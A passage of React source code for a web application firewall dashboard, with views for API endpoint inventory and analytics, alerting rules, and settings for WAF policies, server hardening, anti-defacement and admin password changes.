                    <div><strong>Event type:</strong> <span className="badge-purple" style={{ padding: '2px 6px', background: 'rgba(139, 92, 246, 0.15)', color: '#a78bfa', borderRadius: '4px', fontSize: '11px', fontWeight: 600 }}>{rule.event_type}</span></div>
                    <div><strong>Conditions:</strong> <code style={{ fontSize: '11px', color: '#34d399', fontFamily: 'monospace' }}>{JSON.stringify(rule.conditions)}</code></div>
                    <div><strong>Cooldown throttle:</strong> {rule.throttle_minutes} min</div>
                    <div><strong>Channels assigned:</strong> Channel IDs: {JSON.stringify(rule.channels)}</div>
                  </div>
                  {userRole === 'admin' && (
                    <button className="action-btn-inspect" style={{ alignSelf: 'flex-end', padding: '4px 10px', fontSize: '11px', color: '#f87171', border: '1px solid rgba(239,68,68,0.2)', background: 'rgba(239,68,68,0.06)', margin: 0, marginTop: '8px' }} onClick={() => handleDeleteRule(rule.id)}>
                      Delete Rule
                    </button>
                  )}
                </div>
              ))
            ) : (
              <div className="glass-panel" style={{ gridColumn: 'span 12', padding: '30px', textAlign: 'center', color: '#a1a1aa' }}>
                No active alerting rules defined.
              </div>
            )}
          </div>
        </div>
      )}
    </motion.div>
  );
}

function ApiProtection() {
  const [loading, setLoading] = useState(true);
  const [endpoints, setEndpoints] = useState([]);
  const [recentlyDiscovered, setRecentlyDiscovered] = useState([]);
  const [analytics, setAnalytics] = useState(null);
  const [activeTab, setActiveTab] = useState('inventory'); // 'inventory', 'recent'
  const [topListTab, setTopListTab] = useState('consumed'); // 'consumed', 'resource'

  const fetchData = async () => {
    try {
      const [epsData, recentData, analyticsData] = await Promise.all([
        getDiscoveredEndpoints(),
        getRecentlyDiscoveredEndpoints(),
        getApiProtectionAnalytics()
      ]);
      setEndpoints(epsData);
      setRecentlyDiscovered(recentData);
      setAnalytics(analyticsData);
    } catch (err) {
      console.error("Failed to fetch API protection data", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchData();
    }, 0);
    const interval = setInterval(fetchData, 10000); // refresh every 10 seconds
    return () => {
      clearTimeout(timer);
      clearInterval(interval);
    };
  }, []);

  if (loading && !analytics) {
    return (
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '300px', color: '#a1a1aa', gap: '12px' }}>
        <Activity className="animate-spin" size={24} color="#3b82f6" />
        <span>Loading API Protection statistics & inventory...</span>
      </div>
    );
  }

  // Define grade colors
  const getGradeStyle = (grade) => {
    switch (grade) {
      case 'A': return { color: '#10b981', backgroundColor: 'rgba(16, 185, 129, 0.1)' };
      case 'B': return { color: '#3b82f6', backgroundColor: 'rgba(59, 130, 246, 0.1)' };
      case 'C': return { color: '#fbbf24', backgroundColor: 'rgba(251, 191, 36, 0.1)' };
      case 'D': return { color: '#f97316', backgroundColor: 'rgba(249, 115, 22, 0.1)' };
      default: return { color: '#ef4444', backgroundColor: 'rgba(239, 68, 68, 0.1)' };
    }
  };

  const getMethodStyle = (method) => {
    switch (method) {
      case 'GET': return { color: '#10b981', fontWeight: 'bold' };
      case 'POST': return { color: '#3b82f6', fontWeight: 'bold' };
      case 'PUT': return { color: '#fbbf24', fontWeight: 'bold' };
      case 'DELETE': return { color: '#ef4444', fontWeight: 'bold' };
      default: return { color: '#a1a1aa', fontWeight: 'bold' };
    }
  };

  const trafficData = analytics ? [
    { name: 'Normal', value: analytics.traffic_bands.normal, color: '#10b981' },
    { name: 'Suspicious', value: analytics.traffic_bands.suspicious, color: '#fbbf24' },
    { name: 'Malicious', value: analytics.traffic_bands.malicious, color: '#ef4444' }
  ] : [];

  return (
    <motion.div
      className="api-protection-container animate-fade-in"
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
      style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}
    >
      {/* Analytics Cards Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
        <div className="glass-panel" style={{ padding: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ padding: '12px', borderRadius: '12px', backgroundColor: 'rgba(59, 130, 246, 0.1)', color: '#3b82f6' }}>
            <Globe size={24} />
          </div>
          <div>
            <div style={{ fontSize: '13px', color: '#a1a1aa' }}>Total Discovered Endpoints</div>
            <div style={{ fontSize: '24px', fontWeight: 700, color: '#f4f4f5' }}>{analytics?.total_endpoints_count || 0}</div>
          </div>
        </div>

        <div className="glass-panel" style={{ padding: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ padding: '12px', borderRadius: '12px', backgroundColor: 'rgba(16, 185, 129, 0.1)', color: '#10b981' }}>
            <Clock size={24} />
          </div>
          <div>
            <div style={{ fontSize: '13px', color: '#a1a1aa' }}>Avg API Response Time</div>
            <div style={{ fontSize: '24px', fontWeight: 700, color: '#f4f4f5' }}>{analytics?.avg_response_time_ms || 0} ms</div>
          </div>
        </div>

        <div className="glass-panel" style={{ padding: '20px', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ padding: '12px', borderRadius: '12px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#ef4444' }}>
            <ShieldCheck size={24} />
          </div>
          <div>
            <div style={{ fontSize: '13px', color: '#a1a1aa' }}>WAF Intercepts (Malicious)</div>
            <div style={{ fontSize: '24px', fontWeight: 700, color: '#f4f4f5' }}>{analytics?.traffic_bands.malicious || 0}</div>
          </div>
        </div>
      </div>

      {/* Charts Section */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(12, 1fr)', gap: '16px' }}>
        {/* Traffic Bands Chart */}
        <div className="glass-panel chart-card" style={{ gridColumn: 'span 5', padding: '20px' }}>
          <div style={{ fontSize: '16px', fontWeight: 600, color: '#f4f4f5', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
            <ShieldCheck size={18} color="#10b981" />
            <span>Traffic Classification Bands</span>
          </div>
          <div style={{ height: '200px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            {trafficData.some(d => d.value > 0) ? (
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Pie
                    data={trafficData.filter(d => d.value > 0)}
                    cx="50%"
                    cy="50%"
                    innerRadius={50}
                    outerRadius={70}
                    paddingAngle={4}
                    dataKey="value"
                  >
                    {trafficData.filter(d => d.value > 0).map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={entry.color} />
                    ))}
                  </Pie>
                  <RechartsTooltip
                    contentStyle={{ backgroundColor: 'rgba(15, 16, 22, 0.95)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '8px' }}
                    itemStyle={{ color: '#fff' }}
                  />
                </PieChart>
              </ResponsiveContainer>
            ) : (
              <div style={{ color: '#a1a1aa', fontSize: '13px' }}>No traffic data available</div>
            )}
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-around', marginTop: '16px' }}>
            {trafficData.map(t => (
              <div key={t.name} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px' }}>
                <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: t.color }}></div>
                <span style={{ color: '#a1a1aa' }}>{t.name}:</span>
                <span style={{ color: '#f4f4f5', fontWeight: 600 }}>{t.value}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Top Lists Card */}
        <div className="glass-panel" style={{ gridColumn: 'span 7', padding: '20px', display: 'flex', flexDirection: 'column' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <div style={{ fontSize: '16px', fontWeight: 600, color: '#f4f4f5', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <BarChart2 size={18} color="#3b82f6" />
              <span>Endpoint Analytics Overview</span>
            </div>
            <div className="btn-group" style={{ display: 'flex', gap: '8px', padding: '2px', backgroundColor: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
              <button
                className={`tab-btn ${topListTab === 'consumed' ? 'active' : ''}`}
                onClick={() => setTopListTab('consumed')}
                style={{
                  border: 'none',
                  padding: '6px 12px',
                  borderRadius: '4px',
                  fontSize: '12px',
                  cursor: 'pointer',
                  backgroundColor: topListTab === 'consumed' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
                  color: topListTab === 'consumed' ? '#3b82f6' : '#a1a1aa',
                  fontWeight: topListTab === 'consumed' ? 600 : 500
                }}
              >
                Most Consumed
              </button>
              <button
                className={`tab-btn ${topListTab === 'resource' ? 'active' : ''}`}
                onClick={() => setTopListTab('resource')}
                style={{
                  border: 'none',
                  padding: '6px 12px',
                  borderRadius: '4px',
                  fontSize: '12px',
                  cursor: 'pointer',
                  backgroundColor: topListTab === 'resource' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
                  color: topListTab === 'resource' ? '#3b82f6' : '#a1a1aa',
                  fontWeight: topListTab === 'resource' ? 600 : 500
                }}
              >
                Slowest (Resource-Intensive)
              </button>
            </div>
          </div>

          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '10px', justifyContent: 'center' }}>
            {topListTab === 'consumed' ? (
              analytics?.most_consumed.length > 0 ? (
                analytics.most_consumed.map((ep, idx) => (
                  <div key={idx} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', backgroundColor: 'rgba(255,255,255,0.02)', borderRadius: '6px' }}>
                    <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
                      <span style={getMethodStyle(ep.method)}>{ep.method}</span>
                      <span style={{ color: '#f4f4f5', fontSize: '13px', fontFamily: 'monospace' }}>{ep.uri}</span>
                    </div>
                    <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Hits: <strong style={{ color: '#f4f4f5' }}>{ep.hit_count}</strong></span>
                      <span style={{ padding: '2px 8px', borderRadius: '4px', fontSize: '11px', fontWeight: 600, ...getGradeStyle(ep.grade) }}>Grade {ep.grade}</span>
                    </div>
                  </div>
                ))
              ) : (
                <div style={{ color: '#a1a1aa', fontSize: '13px', textAlign: 'center' }}>No endpoints discovered yet</div>
              )
            ) : (
              analytics?.resource_intensive.length > 0 ? (
                analytics.resource_intensive.map((ep, idx) => (
                  <div key={idx} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 14px', backgroundColor: 'rgba(255,255,255,0.02)', borderRadius: '6px' }}>
                    <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
                      <span style={getMethodStyle(ep.method)}>{ep.method}</span>
                      <span style={{ color: '#f4f4f5', fontSize: '13px', fontFamily: 'monospace' }}>{ep.uri}</span>
                    </div>
                    <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Latency: <strong style={{ color: '#ef4444' }}>{ep.avg_response_time_ms} ms</strong></span>
                      <span style={{ padding: '2px 8px', borderRadius: '4px', fontSize: '11px', fontWeight: 600, ...getGradeStyle(ep.grade) }}>Grade {ep.grade}</span>
                    </div>
                  </div>
                ))
              ) : (
                <div style={{ color: '#a1a1aa', fontSize: '13px', textAlign: 'center' }}>No resource-intensive endpoints detected</div>
              )
            )}
          </div>
        </div>
      </div>

      {/* Main Inventory Section */}
      <div className="glass-panel" style={{ padding: '24px', display: 'flex', flexDirection: 'column', gap: '20px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div className="btn-group" style={{ display: 'flex', gap: '8px', padding: '2px', backgroundColor: 'rgba(255,255,255,0.03)', borderRadius: '6px' }}>
            <button
              className={`tab-btn ${activeTab === 'inventory' ? 'active' : ''}`}
              onClick={() => setActiveTab('inventory')}
              style={{
                border: 'none',
                padding: '8px 16px',
                borderRadius: '4px',
                fontSize: '13px',
                cursor: 'pointer',
                backgroundColor: activeTab === 'inventory' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
                color: activeTab === 'inventory' ? '#3b82f6' : '#a1a1aa',
                fontWeight: activeTab === 'inventory' ? 600 : 500
              }}
            >
              API Inventory
            </button>
            <button
              className={`tab-btn ${activeTab === 'recent' ? 'active' : ''}`}
              onClick={() => setActiveTab('recent')}
              style={{
                border: 'none',
                padding: '8px 16px',
                borderRadius: '4px',
                fontSize: '13px',
                cursor: 'pointer',
                backgroundColor: activeTab === 'recent' ? 'rgba(59, 130, 246, 0.15)' : 'transparent',
                color: activeTab === 'recent' ? '#3b82f6' : '#a1a1aa',
                fontWeight: activeTab === 'recent' ? 600 : 500
              }}
            >
              Recently Discovered (Last 48h)
            </button>
          </div>
          <button className="refresh-btn" onClick={fetchData} style={{ padding: '6px 12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.08)', backgroundColor: 'transparent', color: '#f4f4f5', cursor: 'pointer', fontSize: '12px' }}>
            Scan Logs Now
          </button>
        </div>

        {/* Table representation */}
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
            <thead>
              <tr style={{ borderBottom: '1px solid rgba(255,255,255,0.08)', color: '#a1a1aa' }}>
                <th style={{ padding: '12px 8px' }}>Method</th>
                <th style={{ padding: '12px 8px' }}>Endpoint URI</th>
                <th style={{ padding: '12px 8px' }}>Avg Latency</th>
                <th style={{ padding: '12px 8px' }}>Requests</th>
                <th style={{ padding: '12px 8px' }}>Traffic Source</th>
                <th style={{ padding: '12px 8px' }}>TLS</th>
                <th style={{ padding: '12px 8px' }}>Compression</th>
                <th style={{ padding: '12px 8px' }}>Score</th>
                <th style={{ padding: '12px 8px' }}>Grade</th>
              </tr>
            </thead>
            <tbody>
              {(activeTab === 'inventory' ? endpoints : recentlyDiscovered).length > 0 ? (
                (activeTab === 'inventory' ? endpoints : recentlyDiscovered).map((ep, idx) => {
                  // Traffic Source badge styles
                  const trafficSource = ep.traffic_source || 'Unknown';
                  const trafficBadgeStyle = (() => {
                    switch (trafficSource) {
                      case 'External': return { color: '#60a5fa', background: 'rgba(59,130,246,0.12)', border: '1px solid rgba(59,130,246,0.3)' };
                      case 'Internal': return { color: '#34d399', background: 'rgba(16,185,129,0.12)', border: '1px solid rgba(16,185,129,0.3)' };
                      case 'Mixed': return { color: '#fbbf24', background: 'rgba(251,191,36,0.12)', border: '1px solid rgba(251,191,36,0.3)' };
                      default: return { color: '#71717a', background: 'rgba(113,113,122,0.12)', border: '1px solid rgba(113,113,122,0.3)' };
                    }
                  })();
                  const trafficIcon = { External: '🌐', Internal: '🏠', Mixed: '🔀', Unknown: '❓' }[trafficSource] || '❓';

                  return (
                    <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)', color: '#e4e4e7' }}>
                      <td style={{ padding: '12px 8px', ...getMethodStyle(ep.method) }}>{ep.method}</td>
                      <td style={{ padding: '12px 8px', fontFamily: 'monospace' }}>{ep.uri}</td>
                      <td style={{ padding: '12px 8px' }}>{ep.avg_response_time_ms} ms</td>
                      <td style={{ padding: '12px 8px' }}>{ep.hit_count}</td>
                      <td style={{ padding: '12px 8px' }}>
                        <span style={{
                          display: 'inline-flex',
                          alignItems: 'center',
                          gap: '4px',
                          padding: '3px 10px',
                          borderRadius: '6px',
                          fontSize: '11px',
                          fontWeight: 600,
                          ...trafficBadgeStyle,
                        }}>
                          {trafficIcon} {trafficSource}
                        </span>
                      </td>
                      <td style={{ padding: '12px 8px', color: ep.has_https ? '#10b981' : '#ef4444' }}>
                        {ep.has_https ? 'HTTPS' : 'HTTP'}
                      </td>
                      <td style={{ padding: '12px 8px', color: ep.content_encoding && ep.content_encoding !== 'none' ? '#10b981' : '#a1a1aa' }}>
                        {ep.content_encoding || 'none'}
                      </td>
                      <td style={{ padding: '12px 8px', fontWeight: 600 }}>{ep.score} / 100</td>
                      <td style={{ padding: '12px 8px' }}>
                        <span style={{ padding: '3px 10px', borderRadius: '6px', fontSize: '11px', fontWeight: 700, ...getGradeStyle(ep.grade) }}>
                          {ep.grade}
                        </span>
                      </td>
                    </tr>
                  );
                })
              ) : (
                <tr>
                  <td colSpan="9" style={{ padding: '32px 8px', textAlign: 'center', color: '#a1a1aa' }}>
                    No discovered endpoints listed.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

      </div>
    </motion.div>
  );
}

function Settings({ onLogout }) {
  // General Settings
  const [refreshInterval, setRefreshInterval] = useState('5s');
  const [logsPerPage, setLogsPerPage] = useState('15');
  const [liveUpdates, setLiveUpdates] = useState(true);

  // WAF Settings
  const [secRuleEngine, setSecRuleEngine] = useState('On');
  const [detectionMode, setDetectionMode] = useState('Blocking');
  const [paranoiaLevel, setParanoiaLevel] = useState(1);

  // Log Settings
  const [auditEnabled, setAuditEnabled] = useState(true);
  const [logFormat, setLogFormat] = useState('JSON');
  const [concurrentLogging, setConcurrentLogging] = useState(true);
  const [retention, setRetention] = useState('30 Days');

  // Security Settings
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [sessionTimeout, setSessionTimeout] = useState('1h');



  // Hardening & Cloaking Settings
  const [hstsEnabled, setHstsEnabled] = useState(true);
  const [hstsMaxAge, setHstsMaxAge] = useState(31536000);
  const [serverCloaking, setServerCloaking] = useState(true);
  const [ipBlacklist, setIpBlacklist] = useState("");
  const [ipWhitelist, setIpWhitelist] = useState("");

  // Anti-Defacement Settings
  const [defacementEnabled, setDefacementEnabled] = useState(true);
  const [defacementFiles, setDefacementFiles] = useState("");
  const [checkInterval, setCheckInterval] = useState(5);

  // Notifications & State Controls
  const [toast, setToast] = useState(null);
  const [dangerModal, setDangerModal] = useState(null);
  const [loadingAction, setLoadingAction] = useState(false);
  const [activeSettingTab, setActiveSettingTab] = useState('general');

  useEffect(() => {
    const fetchSettings = async () => {
      try {
        const [gen, logs, waf, hardening, defacement] = await Promise.all([
          getGeneralSettings(),
          getLogSettings(),
          getWafSettings(),
          getHardeningSettings(),
          getAntiDefacementSettings()
        ]);

        if (gen) {
          if (gen.refreshInterval) setRefreshInterval(gen.refreshInterval);
          if (gen.logsPerPage) setLogsPerPage(gen.logsPerPage);
          if (gen.liveUpdates !== undefined) setLiveUpdates(gen.liveUpdates);
        }
        if (logs) {
          if (logs.auditEnabled !== undefined) setAuditEnabled(logs.auditEnabled);
          if (logs.logFormat) setLogFormat(logs.logFormat);
          if (logs.concurrentLogging !== undefined) setConcurrentLogging(logs.concurrentLogging);
          if (logs.retention) setRetention(logs.retention);
        }
        if (waf) {
          if (waf.secRuleEngine) setSecRuleEngine(waf.secRuleEngine);
          if (waf.detectionMode) setDetectionMode(waf.detectionMode);
          if (waf.paranoiaLevel !== undefined) setParanoiaLevel(waf.paranoiaLevel);
        }

        if (hardening) {
          if (hardening.hsts_enabled !== undefined) setHstsEnabled(hardening.hsts_enabled);
          if (hardening.hsts_max_age !== undefined) setHstsMaxAge(hardening.hsts_max_age);
          if (hardening.server_cloaking !== undefined) setServerCloaking(hardening.server_cloaking);
          if (hardening.ip_blacklist !== undefined) setIpBlacklist(hardening.ip_blacklist.join(', '));
          if (hardening.ip_whitelist !== undefined) setIpWhitelist(hardening.ip_whitelist.join(', '));
        }
        if (defacement) {
          if (defacement.enabled !== undefined) setDefacementEnabled(defacement.enabled);
          if (defacement.monitored_files !== undefined) setDefacementFiles(defacement.monitored_files.join(', '));
          if (defacement.check_interval_seconds !== undefined) setCheckInterval(defacement.check_interval_seconds);
        }
      } catch (err) {
        console.error("Failed to load WAF settings from API", err);
      }
    };
    fetchSettings();
  }, []);

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 4000);
  };

  const handleSaveGeneral = async (e) => {
    e.preventDefault();
    setLoadingAction(true);
    try {
      await saveGeneralSettings({
        refreshInterval,
        logsPerPage,
        liveUpdates
      });
      showToast("General preferences saved successfully.");
    } catch (err) {
      showToast(err.message || "Failed to save general settings.", "error");
    } finally {
      setLoadingAction(false);
    }
  };

  const handleSaveWAF = async (e) => {
    e.preventDefault();
    setLoadingAction(true);
    try {
      await saveWafSettings({
        secRuleEngine,
        detectionMode,
        paranoiaLevel
      });
      showToast("WAF core policies updated successfully.");
    } catch (err) {
      showToast(err.message || "Failed to save WAF settings.", "error");
    } finally {
      setLoadingAction(false);
    }
  };



  const handleSaveHardening = async (e) => {
    e.preventDefault();
    setLoadingAction(true);
    try {
      const blacklist = ipBlacklist.split(',').map(ip => ip.trim()).filter(ip => ip);
      const whitelist = ipWhitelist.split(',').map(ip => ip.trim()).filter(ip => ip);
      await saveHardeningSettings({
        hsts_enabled: hstsEnabled,
        hsts_max_age: parseInt(hstsMaxAge) || 31536000,
        server_cloaking: serverCloaking,
        ip_blacklist: blacklist,
        ip_whitelist: whitelist
      });
      showToast("Hardening & Server Cloaking policies updated and applied to NGINX.");
    } catch (err) {
      showToast("Failed to update hardening settings: " + (err.message || "Unknown error"), "error");
    } finally {
      setLoadingAction(false);
    }
  };

  const handleSaveDefacement = async (e) => {
    e.preventDefault();
    setLoadingAction(true);
    try {
      const files = defacementFiles.split(',').map(f => f.trim()).filter(f => f);
      await saveAntiDefacementSettings({
        enabled: defacementEnabled,
        monitored_files: files,
        check_interval_seconds: parseInt(checkInterval) || 5
      });
      showToast("Web Anti-Defacement policies updated successfully.");
    } catch (err) {
      showToast("Failed to update Anti-Defacement settings: " + (err.message || "Unknown error"), "error");
    } finally {
      setLoadingAction(false);
    }
  };

  const handleSaveLogs = async (e) => {
    e.preventDefault();
    setLoadingAction(true);
    try {
      await saveLogSettings({
        auditEnabled,
        logFormat,
        concurrentLogging,
        retention
      });
      showToast("Log ingestion configurations successfully updated.");
    } catch (err) {
      showToast(err.message || "Failed to update log settings.", "error");
    } finally {
      setLoadingAction(false);
    }
  };

  const handleChangePassword = async (e) => {
    e.preventDefault();
    if (!newPassword || newPassword !== confirmPassword) {
      showToast("Passwords do not match or are blank.", "error");
      return;
    }
    setLoadingAction(true);
    try {
      const res = await changeAdminPassword(currentPassword, newPassword);
      showToast(res.message || "Administrator password updated successfully!");
      setCurrentPassword('');
      setNewPassword('');
      setConfirmPassword('');
    } catch (err) {
      showToast(err.message || "Failed to change admin password.", "error");
    } finally {
      setLoadingAction(false);
    }
  };

  const confirmDangerAction = async () => {
    const action = dangerModal;
    setDangerModal(null);
    setLoadingAction(true);
    try {
      if (action === 'restart') {
        const res = await restartWafEngine();
        showToast(res.message || "WAF CyberSentinel Engine container restarted successfully.");
      } else if (action === 'nginx') {
        const res = await reloadNginxProxy();
        showToast(res.message || "NGINX service reloaded gracefully.");
      } else if (action === 'cache') {
        const res = await purgeStatsCache();
        showToast(res.message || "Dashboard analytics cache purged and rebuilt.");
      } else if (action === 'sync') {
        const res = await syncSignatures();
        showToast(res.message || "OWASP CRS signatures synced successfully.");
      }
    } catch (err) {
      showToast(err.message || "Administrative action failed.", "error");
    } finally {
      setLoadingAction(false);
    }
  };

  return (
    <motion.div
      className="settings-container animate-fade-in"
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
    >
      {/* Toast Alert overlay */}
      <AnimatePresence>
        {toast && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className={`toast-alert ${toast.type === 'error' ? 'error' : 'success'}`}
            style={{
              position: 'fixed',
              top: '24px',
              right: '24px',
              zIndex: 9999,
              padding: '12px 24px',
              borderRadius: '8px',
              boxShadow: '0 8px 30px rgba(0,0,0,0.5)',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
              background: toast.type === 'error' ? 'rgba(239, 68, 68, 0.95)' : 'rgba(16, 185, 129, 0.95)',
              border: '1px solid rgba(255,255,255,0.1)',
              color: '#fff',
              fontWeight: 500
            }}
          >
            <ShieldAlert size={18} />
            <span>{toast.message}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Danger Modal confirmation prompt */}
      <AnimatePresence>
        {dangerModal && (
          <div className="modal-overlay" style={{ zIndex: 1100 }}>
            <motion.div
              className="modal-content pulse-warning"
              style={{ maxWidth: '480px', border: '1px solid rgba(239, 68, 68, 0.35)' }}
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
            >
              <div className="modal-header" style={{ background: 'rgba(239, 68, 68, 0.03)', borderBottom: '1px solid rgba(239,68,68,0.15)' }}>
                <div className="modal-title" style={{ color: '#fca5a5' }}>
                  <AlertTriangle size={20} color="#ef4444" />
                  <span>Administrative Action Confirmation</span>
                </div>
                <button className="modal-close-btn" onClick={() => setDangerModal(null)}>
                  <X size={18} />
                </button>
              </div>

              <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ fontSize: '13px', color: '#e4e4e7', lineHeight: '1.5' }}>
                  {dangerModal === 'restart' && "Are you sure you want to restart the CyberSentinel WAF protection engine? This will momentarily disrupt active connection guards."}
                  {dangerModal === 'nginx' && "Are you sure you want to gracefully reload NGINX configurations? This will apply all pending rule changes."}
                  {dangerModal === 'cache' && "Are you sure you want to clear the dashboard local metrics cache? The dashboard data will reload from raw logs."}
                  {dangerModal === 'sync' && "Are you sure you want to download and synchronize the latest OWASP Core Rule Set signatures? This will update your protection definitions."}
                </div>

                <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
                  <button
                    onClick={() => setDangerModal(null)}
                    className="action-btn-inspect"
                    style={{ background: 'transparent', color: '#a1a1aa', borderColor: 'rgba(255,255,255,0.1)' }}
                  >
                    Cancel
                  </button>
                  <button
                    onClick={confirmDangerAction}
                    className="action-btn-inspect"
                    style={{ background: '#ef4444', color: '#fff', borderColor: 'transparent', padding: '6px 16px' }}
                  >
                    Confirm Action
                  </button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <div className="settings-layout" style={{ display: 'flex', gap: '32px', alignItems: 'flex-start' }}>

        {/* Sidebar Navigation */}
        <div className="settings-sidebar">
          <div style={{ fontSize: '12px', fontWeight: 600, color: '#71717a', textTransform: 'uppercase', letterSpacing: '1.2px', marginBottom: '10px', paddingLeft: '16px' }}>Configuration</div>

          <button onClick={() => setActiveSettingTab('general')} className={`settings-tab-btn ${activeSettingTab === 'general' ? 'active' : ''}`}>
            <SettingsIcon size={20} /> General Setup
          </button>
          <button onClick={() => setActiveSettingTab('waf')} className={`settings-tab-btn ${activeSettingTab === 'waf' ? 'active' : ''}`}>
            <ShieldCheck size={20} /> WAF Engine Policies
          </button>
          <button onClick={() => setActiveSettingTab('logs')} className={`settings-tab-btn ${activeSettingTab === 'logs' ? 'active' : ''}`}>
            <Database size={20} /> Log Pipeline
          </button>
          <button onClick={() => setActiveSettingTab('hardening')} className={`settings-tab-btn ${activeSettingTab === 'hardening' ? 'active' : ''}`}>
            <Server size={20} /> Server Hardening
          </button>
          <button onClick={() => setActiveSettingTab('defacement')} className={`settings-tab-btn ${activeSettingTab === 'defacement' ? 'active' : ''}`}>
            <ShieldAlert size={20} /> Anti-Defacement
          </button>
          <button onClick={() => setActiveSettingTab('security')} className={`settings-tab-btn ${activeSettingTab === 'security' ? 'active' : ''}`}>
            <Lock size={20} /> Security & Danger Zone
          </button>
        </div>

        {/* Main Content Area */}
        <div className="settings-content-area">
          <AnimatePresence mode="wait">

            {activeSettingTab === 'general' && (
              <motion.div key="general" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
                <div className="settings-section-title">
                  <SettingsIcon size={20} color="#3b82f6" />
                  General Settings
                </div>
                <div className="settings-section-subtitle">Configure dashboard behavior and real-time updates.</div>

                <form onSubmit={handleSaveGeneral} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Dashboard Refresh Interval</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={refreshInterval} onChange={(e) => setRefreshInterval(e.target.value)}>
                      <option value="3s">3 Seconds (Sync Active)</option>
                      <option value="5s">5 Seconds (Recommended)</option>
                      <option value="10s">10 Seconds</option>
                      <option value="30s">30 Seconds</option>
                      <option value="off">Disabled / Manual</option>
                    </select>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Live Logs Per Page</label>
                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={logsPerPage} onChange={(e) => setLogsPerPage(e.target.value)}>
                      <option value="10">10 entries</option>
                      <option value="15">15 entries</option>
                      <option value="25">25 entries</option>
                      <option value="50">50 entries</option>
                      <option value="100">100 entries</option>
                    </select>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '10px', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Live Inbound Stream</span>
                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Stream logs dynamically from the backend</span>
                    </div>
                    <div className={`toggle-switch ${liveUpdates ? 'active' : ''}`} onClick={() => setLiveUpdates(!liveUpdates)}>
                      <div className="toggle-knob"></div>
                    </div>
                  </div>
